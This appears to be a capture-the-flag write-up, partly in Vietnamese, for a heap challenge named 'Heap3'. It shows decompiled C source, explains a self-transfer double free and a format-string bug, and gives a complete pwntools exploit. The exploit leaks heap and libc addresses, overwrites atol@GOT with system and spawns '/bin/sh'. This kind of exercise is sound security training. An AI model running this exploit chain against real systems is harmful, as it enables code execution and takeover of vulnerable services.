# Heap3

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
```

## source

```c
struct user
{
  char *name;
  char *pass;
  __int64 money;
  Bill *Trans;
};
```

```c
struct Bill
{
  Bill *nextBill;
  user *srUSER;
  __int64 TransID;
  __int64 type;
  __int64 amount;
};
```

```c
void __fastcall main(__int64 a1, char **a2, char **a3)
{
  int v3; // eax
  int v4; // [rsp+Ch] [rbp-24h]
  const user *username; // [rsp+18h] [rbp-18h]
  char buf[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setup();
  banner();
  v4 = 0;
  username = 0LL;
  while ( 1 )
  {
    puts("------------------------------------------------");
    puts(" 1: register user");
    puts(" 2: login user");
    puts(" 3: exit");
    puts("------------------------------------------------");
    puts("which command?");
    printf("> ");
    read(0, buf, 4uLL);
    v3 = atoi(buf);
    switch ( v3 )
    {
      case 2:
        username = login();
        if ( username )
        {
          printf("[+] Welcome to EasyCoin, %s\n\n", username->name);
          v4 = 1;
        }
        break;
      case 3:
        exit(0);
      case 1:
        register();
        break;
      default:
        puts("[-] Invalid command!");
        break;
    }
    while ( v4 )
    {
      puts("------------------------------------------------");
      puts(" 1: display user info");
      puts(" 2: send coin");
      puts(" 3: display transaction");
      puts(" 4: change password");
      puts(" 5: delete this user");
      puts(" 6: logout");
      puts("------------------------------------------------");
      puts("which command?");
      printf("> ");
      read(0, buf, 4uLL);
      switch ( buf[0] )
      {
        case '1':
          info((user *)username);
          break;
        case '2':
          send((user *)username);
          break;
        case '3':
          ViewTrans((user *)username);
          break;
        case '4':
          changePass((user *)username);
          break;
        case '5':
          delete((user *)username);
          v4 = 0;
          break;
        case '6':
          v4 = 0;
          break;
        default:
          printf("[-] Unknown Command: ");
          printf(buf);
          break;
      }
    }
  }
}
```

```c
__int64 __fastcall send(user *sender)
{
  int i; // [rsp+18h] [rbp-58h]
  int Amount; // [rsp+1Ch] [rbp-54h]
  Bill *j; // [rsp+20h] [rbp-50h]
  Bill *k; // [rsp+20h] [rbp-50h]
  user *RecvEr; // [rsp+28h] [rbp-48h]
  Bill *sendbill; // [rsp+30h] [rbp-40h]
  Bill *recvbill; // [rsp+38h] [rbp-38h]
  char s2[40]; // [rsp+40h] [rbp-30h] BYREF
  unsigned __int64 v10; // [rsp+68h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  if ( TransCount > 0x64 )
  {
    puts("[-] Transaction is over");
    exit(1);
  }
  printf("What user do you send to?\n> ");
  readStr(s2, 31);
  for ( i = 0; ; ++i )
  {
    if ( i > 4 )
    {
      puts("[-] This user is not registered");
      return 1LL;
    }
    if ( userlist[i] && !strcmp(userlist[i]->name, s2) )
      break;
  }
  RecvEr = userlist[i];
  printf("Hom many?\n> ");
  read(0, s2, 20uLL);
  Amount = atol(s2);
  if ( Amount > 0 && sender->money - Amount >= 0 )
  {
    recvbill = (Bill *)malloc(0x28uLL);
    recvbill->nextBill = 0LL;
    recvbill->srUSER = sender;
    recvbill->amount = Amount;
    recvbill->TransID = TransCount;
    recvbill->type = 1LL;
    RecvEr->money += Amount;
    if ( RecvEr->Trans )
    {
      for ( j = RecvEr->Trans; j->nextBill; j = j->nextBill )
        ;
      j->nextBill = recvbill;
    }
    else
    {
      RecvEr->Trans = recvbill;
    }
    sendbill = (Bill *)malloc(0x28uLL);
    sendbill->nextBill = 0LL;
    sendbill->srUSER = RecvEr;
    sendbill->amount = Amount;
    sendbill->TransID = TransCount;
    sendbill->type = 0LL;
    sender->money -= Amount;
    ++TransCount;
    if ( sender->Trans )
    {
      for ( k = sender->Trans; k->nextBill; k = k->nextBill )
        ;
      k->nextBill = sendbill;
    }
    else
    {
      sender->Trans = sendbill;
    }
    puts("[+] Transaction success");
    return 0LL;
  }
  else
  {
    puts("[-] Can't execute this transaction");
    return 1LL;
  }
}
```

```c
__int64 __fastcall delete(user *a1)
{
  int v2; // [rsp+18h] [rbp-18h]
  int i; // [rsp+1Ch] [rbp-14h]
  Bill *Trans; // [rsp+20h] [rbp-10h]
  Bill *ptr; // [rsp+28h] [rbp-8h]

  v2 = -1;
  for ( i = 0; i <= 4; ++i )
  {
    if ( userlist[i] == a1 )
    {
      v2 = i;
      break;
    }
  }
  free(a1->name);
  free(a1->pass);
  if ( a1->Trans )
  {
    Trans = a1->Trans;
    while ( 1 )
    {
      deleteTrans(Trans->srUSER, (unsigned int)Trans->TransID);
      if ( !Trans->nextBill )
        break;
      ptr = Trans;
      Trans = Trans->nextBill;
      ptr->srUSER = 0LL;
      ptr->nextBill = 0LL;
      free(ptr);
    }
    free(Trans);
  }
  else
  {
    puts("[-] No transaction");
  }
  free(a1);
  userlist[v2] = 0LL;
  return 0LL;
}
```

## Vulnerability

Ở hàm `send` khi chương trình yêu cầu nhập tên user để chuyển tiền, ta có thể nhập tên của chính user đang đăng nhập. Từ đó sẽ dẫn tới lỗi logic của chương trình. Từ lỗi này khi free  chương trình sẽ chạy không đúng thiết kế ban đầu. Mình sẽ debug để hiểu rõ hơn. Ngoài ra còn có một lỗi format string ở cuối hàm main.

## Debug & exploit

### Double free

Chương trình sử dụng danh sách liên kết đơn để lưu trữ các giao dịch của mỗi user. Vậy nếu như ta gửi tiền từ một user cho chính user đó, khi delete user thì sẽ có 2 trường hợp xảy ra:

- Trường hợp 1: Khi cái bill "lỗi" đó ở đầu danh sách liên kết
![a](1.png)
    *ở phần này mình thiếu. vì khi tạo bill sẽ có 1 bill người nhận 1 bill người gửi. nên sẽ có 1 bill nữa liên kết giống như của ảnh dưới.*
- Trường hợp 2: Khi cái bill "lỗi" đó không phải ở đầu danh sách liên kết
![a](2.png)

    Sau khi đã free xong bill 0 và bill 3. Fastbin list sẽ giống như sau:
    ![a](3.png)
    Tiếp sau đó, chương trình sẽ tiếp tục free bill1. Khi chương trình call đến `deleteTrans`, vòng lặp sẽ chạy từ `bill0`, lúc này giá trị của `bill0->nextBill` sẽ không phải bill1 mà là bill3. Tuy nhiên, địa chỉ của `nextBill` là được return từ `malloc` nên nó tính từ địa chỉ mà user có thể nhập dữ liệu. Còn địa chỉ của bill 3 lúc này bắt đầu từ `prev_size` của bill 3. Vậy nên ta có thể dùng giá trị amount của `billID = 0` để có thể kiểm soát địa chỉ sẽ được trỏ đến tiếp theo trong danh sách liên kết. Lúc này cho nó trỏ đến địa chỉ của `user0 password`. sau đó delete user0, password của user 0 sẽ bị double free. Sau đó sử dụng hàm changepass để attack tiếp.

### exploit

```python
p = start()
libc = ELF('./libc.2.23.so')

def register(name, passwd):
    p.sendafter(b'> ', b'1')
    p.sendafter(b'username\n> ', name)
    p.sendafter(b'password\n> ', passwd)
    p.sendafter(b'password\n> ', passwd)

def login(name, passwd):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'username\n> ', name)
    p.sendafter(b'password\n> ', passwd)


def info(username, password):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'username\n> ', username)

def send(username, money):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'to?\n', username)
    p.sendlineafter(b'many?\n', str(money).encode())

def view_trans():
    p.sendlineafter(b'> ', b'3')

def change_passwd(password):
    p.sendlineafter(b'> ', b'4')
    p.sendafter(b'password\n> ', password)

def delete():
    p.sendlineafter(b'> ', b'5')

def logout():
    p.sendlineafter(b'> ', b'6')

##################################
### Stage 1: Leak heap address ###
##################################
# User 0 has password used for double free
register(b'0'*0x8 + b'\n', flat(0, 0, 1))

# User 1 will free password of user 0
register(b'1'*0x8 + b'\n', b'1'*0x8)

# User 2 is used to increasing TransCount to create fake size
# Password of user 2 is used for fake username and fake password
register(b'2'*0x8 + b'\n', flat(elf.got['atol'], elf.got['atol']))

# Leak heap address
login(b'0'*0x8 + b'\n', flat(0, 0, 1))
p.sendafter(b'> ', b'%9$p')
p.recvuntil(b'Command: ')
heap_leak = int(p.recvuntil(b'------------------------------------------------', drop=True)[:-2], 16)
heap_base = heap_leak - 0x10
log.info("Heap leak: " + hex(heap_leak))
log.info("Heap base: " + hex(heap_base))

##################################
### Stage 2: Leak libc address ###
##################################
# Leak libc address
p.sendafter(b'> ', b'%3$p')
p.recvuntil(b'Command: ')
libc_leak = int(p.recvuntil(b'------------------------------------------------', drop=True)[:-2], 16)
libc.address = libc_leak - 0xda7a0
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))
logout()

############################
### Stage 3: Double free ###
############################
# The first Trans cannot be used for double free because
# it doesn't point to amount of a transaction
log.info("stage 3")
login(b'0'*0x8 + b'\n', flat(0, 0, 1))
send(b'1'*0x8 + b'\n', heap_base + 0x70)            # Don't delete user with trans near password
logout()

# User 1 send to user 1 to trigger double free
login(b'1'*0x8 + b'\n', b'1'*0x8)
send(b'1'*0x8 + b'\n', 0x11111111)
logout()

# Increase TransCount to Create fake size for fake chunk
login(b'2'*0x8 + b'\n', flat(elf.got['atol'], elf.got['atol']))
for i in range(0x2f):
    send(b'2'*0x8 + b'\n', 0x22222222)
logout()

# Delete user 1 first then delete user 0 to double free password of user 0
login(b'1'*0x8 + b'\n', b'1'*0x8)
delete()

login(b'0'*0x8 + b'\n', flat(heap_base + 0x1b0))
delete()

############################################
### Stage 3: Change userlist & get shell ###
############################################
# Overwrite fw pointer to make sure our password is our fake chunk
# in bss
register(p64(heap_base + 0x30), p64(0x6030e0))

# Get 3 chunks in bin
register(b'3'*0x8, b'3'*0x8)

# Overwrite user 0 with our fake user, which is password of user 2
register(b'4'*0x8, b'4'*0x10 + flat(heap_base + 0x190))

# Login to fake user
login(p64(libc.sym['atol']), p64(libc.sym['atol']))

# Password is atol@got, overwrite to system
change_passwd(p64(libc.sym['system']))

# Get shell when it read money
send(p64(libc.sym['system']), '/bin/sh\0')

p.interactive()
```
